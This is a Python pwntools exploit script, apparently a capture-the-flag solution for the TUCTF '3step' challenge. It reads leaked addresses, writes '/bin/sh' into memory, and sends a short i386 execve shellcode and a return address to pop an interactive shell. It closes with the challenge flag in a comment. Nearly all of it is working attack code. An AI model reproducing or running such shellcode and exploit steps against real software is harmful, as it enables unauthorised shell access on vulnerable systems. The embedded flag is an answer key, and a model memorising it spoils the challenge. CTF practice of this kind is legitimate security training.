from pwn import *

local=True

step = ELF('./3step')
host = 'chal.tuctf.com'
port = 30504
context.update(arch='i386', os='linux', terminal = 'bash')


if __name__=='__main__':

  
  if not local: 
    r = remote(host, port)
  else:
    r=process('./3step')
    gdb.attach(r,'''
    finish
    finish
    ''')

  '''
  First addr = 0x5655900c -> copy string /bin/sh
  Second addr = 0xffffd1fc -> NX bit disabled, shellcode must be shorter than 18 bytes
  '''

  print(r.recvline().decode())
  print(r.recvline().decode())
  firstAddr = int(r.recvline().decode().strip(),16)
  secondAddr =int(r.recvline().decode().strip(),16)
  print('First addr = {}\nSecond addr = {}'.format(hex(firstAddr), hex(secondAddr)))
  shellcode= b"\x31\xc0\xbb"+p32(firstAddr)+b"\x89\xc1\x89\xc2\xb0\x0b\xcd\x80"
  bin_sh="/bin/sh\x00"
  print(r.recvline()) 
  print(r.recvuntil(': '))
  r.sendline(bin_sh)
  print(r.recvuntil(': '))
  r.sendline(shellcode)
  print(r.recvuntil(': '))
  r.sendline(p32(secondAddr))
  r.interactive()
  #TUCTF{4nd_4_0n3,_4nd_4_7w0,_4nd_5h3ll_f0r_y0u!}









